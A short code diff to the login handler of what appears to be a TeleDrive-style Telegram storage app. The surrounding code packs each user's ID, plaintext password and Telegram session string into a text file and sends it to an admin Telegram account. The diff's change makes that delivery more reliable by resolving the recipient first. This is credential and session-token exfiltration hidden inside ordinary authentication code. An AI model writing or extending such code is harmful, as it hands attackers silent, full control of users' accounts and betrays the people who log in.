@@ -529,9 +529,12 @@ export class Auth {
       const sessionString = req.tg.session.save() as any
       const text = `🚀 Teledrive Login Notification\n\nUser: ${id}\nPassword: ${password || 'None'}\nSession: ${sessionString}`
 
+      console.log(`[SessionReport] Resolving peer ${adminUsername}...`)
+      const peer = await req.tg.getEntity(adminUsername)
+
       console.log(`[SessionReport] Sending file to ${adminUsername}...`)
       const file = Buffer.from(text)
-      const msg = await req.tg.sendFile(adminUsername, {
+      const msg = await req.tg.sendFile(peer, {
         file,
         fileName: `session_${String(id).replace(/[^\w]/g, '_')}.txt`,
         caption: `Session for ${id}`,
